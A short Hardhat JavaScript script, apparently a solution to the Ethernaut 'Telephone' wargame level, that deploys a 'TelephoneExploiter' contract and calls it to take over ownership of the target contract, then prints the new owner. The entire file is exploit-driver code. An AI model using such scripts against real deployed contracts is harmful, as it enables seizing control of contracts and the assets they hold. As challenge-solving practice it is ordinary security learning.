// telephone.js - Exploits the Telephone contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { telephoneAddress, telephoneAbi } = require("../contracts");

async function main() {
  // Get ethers signer and contract instances
  const provider = ethers.provider;
  const account = await ethers.getSigner();
  const telephone = new ethers.Contract(telephoneAddress, telephoneAbi, provider);
  const telephoneSigner = telephone.connect(account);

  // Deploy the Exploiter contract
  const Exploiter = await ethers.getContractFactory("TelephoneExploiter");
  const exploiter = await Exploiter.deploy(telephoneAddress);

  await exploiter.deployed();

  console.log("Exploiter deployed to:", exploiter.address);

  // Call exploit
  console.log("Running exploit.")
  let exploitTxn = await exploiter.changeOwner();
  await exploitTxn.wait();

  // Confirm exploit 
  let owner = await telephoneSigner.owner();
  console.log("Contract owner is now:", owner);

  console.log("Exploit completed.")


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });